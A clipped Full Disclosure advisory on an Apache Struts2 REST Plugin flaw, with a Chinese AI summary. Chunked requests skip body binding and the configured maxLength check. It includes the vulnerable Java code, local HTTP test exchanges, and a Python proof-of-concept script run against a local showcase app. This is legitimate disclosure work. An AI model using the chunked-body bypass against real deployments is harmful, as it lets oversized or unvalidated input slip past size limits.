---
title: Apache Struts2 REST Plugin Fails to Properly Parse Chunked	Requests
source: https://seclists.org/fulldisclosure/2026/Nov/2
source_host: seclists.org
clip_date: 2026-11-02T14:50:53+08:00
trace_id: 6fdc40a2-b9ec-414f-badf-3a2cef723709
content_hash: 0f250e73fe262cf67a7ce852620b742198b702318e884971b73f5b4a6fa3afa6
status: synced
tags:
  - 漏洞分析
  - 协议分析
series: null
feed_source: Full Disclosure·漏洞披露
ai_summary: Apache Struts2 REST Plugin（≤7.4.0）以 `Content-Length > 0` 作为处理请求体的前提条件，导致 chunked 编码请求完全跳过反序列化和大小限制防护。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 40c75244-d011-819e-bf06-c6737c7a2558
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Apache Struts2 REST Plugin（≤7.4.0）以 `Content-Length > 0` 作为处理请求体的前提条件，导致 chunked 编码请求完全跳过反序列化和大小限制防护。
> 
> - **触发条件：** `ContentTypeInterceptor.intercept()` 中 `if (request.getContentLength() > 0)` 同时控制请求体反序列化和 `BoundedReader` 大小检查；chunked 请求因无 `Content-Length` 头而使 `getContentLength()` 合法返回 `-1`，整段处理逻辑被跳过，且无任何上游代码单独检查 `Transfer-Encoding`。
> - **防护失效：** `struts.rest.content.maxLength` 限制位于被跳过的分支内，攻击者可提交任意大小的 chunked 请求体而绕过配置的大小上限。
> - **静默失败：** 请求体字段不会绑定到模型，也不抛异常、不告警、不记日志；下游依赖字段已绑定的逻辑（默认值校验、业务验证等）会按"字段从未设置"的行为处理，实际后果取决于具体应用代码，可能严重也可能无碍。
> - **实测验证：** 在 rest-showcase（Struts 7.5.0-SNAPSHOT）上测试：字节完全相同的 JSON，携带 `Content-Length` 时返回 201 并成功创建订单；改用 `Transfer-Encoding: chunked` 后返回 400（"The client name is empty"），订单未创建，调用方无从得知是 chunked 编码导致。
> - **缓解提示：** 拦截器顺序或额外拦截器可能使请求体仍被其他组件解析，但 REST Plugin 的防护不会生效，严重性评估需结合具体应用的数据流。

## Full Disclosure mailing list archives

## Apache Struts2 REST Plugin Fails to Properly Parse Chunked Requests

* * *

*From*: Daniel Owens via Fulldisclosure <fulldisclosure () seclists org>  
*Date*: Thu, 29 Oct 2026 12:33:43 +0000  

* * *

````swift
Description
The Apache Struts2 REST Plugin's (version 7.4.0 and below) `ContentTypeInterceptor.intercept(ActionInvocation)` only 
deserialises a request body and enforces the `struts.rest.content.maxLength` bound when 
`HttpServletRequest#getContentLength()` returns a positive value.  `getContentLength()` returns `-1` whenever the 
`Content-Length` header is absent, which normal and appropriate for any Hypertext Transfer Protocol (HTTP) request sent 
with `Transfer-Encoding: chunked`, so the entire body-processing branch -- including the bounded-reader size check -- 
is skipped for every such request.

Impact
Any client that sends a chunked-encoded request body causes the action to be invoked as though no body had been sent at 
all, with every body field silently left unbound and no exception, warning, or rejection raised to either the caller or 
the server logs.  While a potentially minor or major detail, it is important to note that because the interceptor fails 
to parse the request body, the `struts.rest.content.maxLength` guard provides no protection whatsoever, as the 
`BoundedReader` that enforces it sits inside the branch that chunked requests never enter.  An attacker can, as such, 
submit an arbitrarily large chunked body without the configured size ceiling ever being consulted, and any downstream 
logic that assumes a submitted field was bound -- default-initialisation checks, business validation keyed to a 
now-absent value, and the like -- will silently fall back to whatever behaviour applies when the field was never set.  
It is important to note that the downstream logic is application-specific and that your application may do something 
terribly wrong or may not depending on your specific code -- Apache's Struts2 REST Plugin merely introduces the 
unexpected pathway -- and that interceptor ordering, additional interceptors, etc., may cause the body to still be 
parsed and deserialised, only that the Apache Struts2 REST Plugin will not take part in such activities, which may 
further complicate the severity calculation (if, for example, data flows through the REST Plugin and then into a custom 
JSON deserialiser via another interceptor, the assumed "protections" of the REST Plugin would never have taken place 
and the default path of your code may assume an INDEX or similar request).

Examples
Sample Code
`intercept(ActionInvocation)` guards the entire body-deserialisation and size-enforcement block on 
`request.getContentLength() > 0`, so a chunked request -- for which `getContentLength()` legitimately returns `-1` -- 
falls straight through to `invocation.invoke()` with the body never read.

```java
    public String intercept(ActionInvocation invocation) throws Exception {
        HttpServletRequest request = ServletActionContext.getRequest();
        ContentTypeHandler handler = selector.getHandlerForRequest(request);

        Object target = invocation.getAction();
        if (target instanceof ModelDriven) {
            target = ((ModelDriven<?>) target).getModel();
        }

        if (request.getContentLength() > 0) {
            BoundedReader reader = new BoundedReader(openBodyReader(request), maxLength);
            try {
                applyRequestBody(invocation, handler, target, reader);
            } catch (Exception e) {
                if (reader.limitExceeded()) {
                    throw requestBodyTooLarge();
                }
                throw e;
            }
            if (reader.limitExceeded()) {
                throw requestBodyTooLarge();
            }
        }
        return invocation.invoke();
    }
```
Code snippet from `struts2-rest-plugin`'s 
plugins/rest/src/main/java/org/apache/struts2/rest/ContentTypeInterceptor.java, lines 114-138, with line 123's `if 
(request.getContentLength() > 0)` gating both `applyRequestBody()` and every `BoundedReader`/`maxLength` check; nothing 
in this method, or any upstream code, separately inspects `Transfer-Encoding` and handles chunked encoding

Sample Dynamic Testing
The following was against the rest-showcase codebase, running Struts 7.5.0-SNAPSHOT, built on 28 October 2026.  The 
first, an ordinary `Content-Length`-bearing submission, correctly binds `clientName` and creates a new order.  The 
second, a byte-identical JavaScript Object Notation (JSON) body sent with `Transfer-Encoding: chunked` and no 
`Content-Length` header, is never bound onto the model at all -- `validate()` fires against `clientName`'s untouched 
Java default and the action rejects the request with only the ordinary field-validation error a caller would see for a 
genuinely empty submission.  Importantly, how the information system behaves is dependent on the information system, 
itself, so while the rest-showcase example behaves as such, yours may do something considerably worse.

```http
POST /rest-showcase/orders HTTP/1.1
Host: 127.0.0.1:8383
Content-Type: application/json
Accept: application/json
Content-Length: 47

{"clientName":"CalibrationNormal","amount":11}
```
Request -- an ordinary, `Content-Length`-bearing submission

```http
HTTP/1.1 201
Location: http://127.0.0.1:8383/rest-showcase/orders/6
```
Response -- `201`; the order is created with `clientName` correctly bound from the submitted body

```http
POST /rest-showcase/orders HTTP/1.1
Host: 127.0.0.1:8383
Content-Type: application/json
Accept: application/json
Transfer-Encoding: chunked

2f\r
{"clientName":"CalibrationChunked","amount":22}\r
0\r
\r

```
Request -- the byte-identical JavaScript Object Notation (JSON) body, now sent with `Transfer-Encoding: chunked` and 
without a `Content-Length` header

```http
HTTP/1.1 400
Content-Type: application/json;charset=UTF-8

{"actionErrors":[],"fieldErrors":{"clientName":["The client name is empty"]}}
```
Response -- `400`; `clientName` was never bound, so `validate()` rejects the request as though an empty body had been 
submitted with no indication that the chunked encoding itself was the cause; a subsequent `GET 
/rest-showcase/orders.json` confirms that no order named `CalibrationChunked` was ever created whilst the first 
request's `CalibrationNormal` order (`id: 6`) is present

Steps to Reproduce
Run the following self-contained script against a running rest-showcase deployment. It creates one order via an 
ordinary request, attempts to create a second via a chunked request, confirms the chunked attempt was never bound, and 
cleans up the one order it legitimately created, independently re-verifying the cleanup succeeded.

```python
#!/usr/bin/env python3
"""Standalone reproduction for "`Content-Length` Guard Skips Chunked Request
Body Processing" against the struts2-rest-plugin's ContentTypeInterceptor,
exercised live through rest-showcase's OrdersController.

Requires `pip install requests`.
"""
import sys
import time
import requests

BASE_URL = "http://127.0.0.1:8383/rest-showcase";


def chunked_body(payload: bytes):
    # A generator body forces requests/urllib3 to send Transfer-Encoding:
    # chunked with no Content-Length header at all -- the standard
    # mechanism several HTTP client libraries use for streamed bodies
    yield payload


def list_order_ids() -> set:
    response = requests.get(f"{BASE_URL}/orders.json", timeout=20)
    response.raise_for_status()
    return {order["id"] for order in response.json()}


def main() -> bool:
    marker = str(int(time.time() * 1000))
    normal_name = f"ChunkedGuardNormal-{marker}"
    chunked_name = f"ChunkedGuardChunked-{marker}"

    baseline_ids = list_order_ids()
    print(f"baseline order ids: {sorted(baseline_ids)}")

    # 1) Ordinary, Content-Length-bearing POST -- the control case
    normal_body = f'{{"clientName":"{normal_name}","amount":11}}'.encode("utf-8")
    normal_response = requests.post(
        f"{BASE_URL}/orders",
        data=normal_body,
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        timeout=20,
    )
    print(f"normal POST -> HTTP {normal_response.status_code}, "
          f"Location={normal_response.headers.get('Location')}")

    after_normal_ids = list_order_ids()
    created_ids = after_normal_ids - baseline_ids
    normal_created = normal_response.status_code == 201 and len(created_ids) == 1
    if not normal_created:
        print("FAIL: the control (Content-Length) request did not create an order as expected")
        return False
    created_id = created_ids.pop()
    print(f"control request created order {created_id} ({normal_name}) -- binding works normally")

    # 2) Byte-identical JSON, sent via a generator body
    chunked_payload = f'{{"clientName":"{chunked_name}","amount":22}}'.encode("utf-8")
    chunked_response = requests.post(
        f"{BASE_URL}/orders",
        data=chunked_body(chunked_payload),
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        timeout=20,
    )
    sent_headers = chunked_response.request.headers
    print(f"chunked POST -> HTTP {chunked_response.status_code}")
    print(f"outbound request headers: Transfer-Encoding={sent_headers.get('Transfer-Encoding')}, "
          f"Content-Length={sent_headers.get('Content-Length')}")

    after_chunked_ids = list_order_ids()
    chunked_created = len(after_chunked_ids - after_normal_ids) > 0

    vulnerable = (
        sent_headers.get("Transfer-Encoding") == "chunked"
        and "Content-Length" not in sent_headers
        and chunked_response.status_code == 400
        and not chunked_created
    )

    if vulnerable:
        print(f"VULNERABLE: the chunked request's body was never bound onto the model -- "
              f"OrdersController.validate() rejected it with HTTP {chunked_response.status_code} "
              f"({chunked_response.json()}), and no order named {chunked_name!r} was ever created, "
              f"even though the byte-identical body succeeded moments earlier when sent with "
              f"Content-Length instead.")
    else:
        print("did not reproduce")

    # Cleanup: remove the one order this script legitimately created, then
    # independently re-verify the cleanup actually took effect. The chunked
    # request never created anything, so there is nothing to delete for it
    delete_response = requests.delete(f"{BASE_URL}/orders/{created_id}", timeout=20)
    print(f"cleanup: DELETE /orders/{created_id} -> HTTP {delete_response.status_code}")
    final_ids = list_order_ids()
    if created_id in final_ids:
        print(f"WARNING: cleanup did not remove order {created_id}; remove it manually")
    else:
        print(f"cleanup verified: order {created_id} no longer present (back to baseline)")

    return vulnerable


if __name__ == "__main__":
    sys.exit(0 if main() else 1)
```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/

````
